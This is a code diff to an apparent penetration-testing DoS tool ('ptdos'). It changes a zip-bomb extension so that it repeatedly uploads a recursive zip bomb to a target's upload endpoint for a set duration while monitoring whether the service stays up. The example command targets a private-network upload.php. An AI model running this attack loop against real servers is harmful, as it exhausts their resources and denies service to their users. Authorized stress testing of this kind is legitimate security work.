@@ -2,12 +2,12 @@
 
 
 """ptdos extension that adds a zipbomb attack"""
-# python3 ptdos.py -a zipbomb -d 5
+#python3 ptdos.py -a zipbomb -ds 1 -l 5 -c 5 -dst http://192.168.0.80/upload.php -o mini.zip
 
 # own libs
 from infrastructure import factory
 from misc.pt_zip import make_recurssive_bomb
-from monitoring.ptcheckservice import print_error
+from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
 from misc.pt_http import post_file_upload
 # external libs
 from dataclasses import dataclass
@@ -42,23 +42,30 @@ class ZipBomb:
         if "127.0.0.1" in dst or "localhost" in dst:
             ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
             return
-
-        post_file_upload(dst,str(randbytes(8).hex())+".zip",bomb)
-
         
-
         monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
+        ctx = 0
         try:
             while True:
                 if time() - att_start_t_epoch >= duration:
-                    break #TODO
+                    monitoringprocess()
+                    sleep(1)
+                    att_end_t_asc = asctime()
+                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
+                    break
+                
+                if post_file_upload(dst, str(randbytes(8).hex()) + ".zip", bomb):
+                    ctx += 1
+                sleep(1)
+
         except BaseException as err:
-            monitoringprocess()  # stop checkservice end monitoring
-            return print_error(json_obj, use_json, json_no, self.name, err.args[0])
+            monitoringprocess()
+            return print_error(json_obj, use_json, json_no, self.name, str(err))
+
+        attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, ctx)
+        monitoring.checkservice_append_out_data(json_obj, use_json, json_no)
 
         return
-        
-        
 
     @staticmethod
     def make_help():
